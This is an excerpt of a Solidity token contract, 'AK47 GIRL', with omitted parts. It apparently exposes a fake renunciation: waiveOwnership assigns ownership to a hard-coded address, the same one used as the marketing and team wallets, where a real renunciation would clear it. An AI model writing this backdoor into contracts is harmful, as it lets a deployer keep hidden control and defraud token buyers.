...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x344923b0C94804B26a770E9B1f413Bb3C77AdaA9);
    }
...
contract AK47GIRL is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AK47 GIRL";
    string private _symbol = "AKGIRL";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x344923b0C94804B26a770E9B1f413Bb3C77AdaA9);
    address payable private teamWalletAddress = payable(0x344923b0C94804B26a770E9B1f413Bb3C77AdaA9);
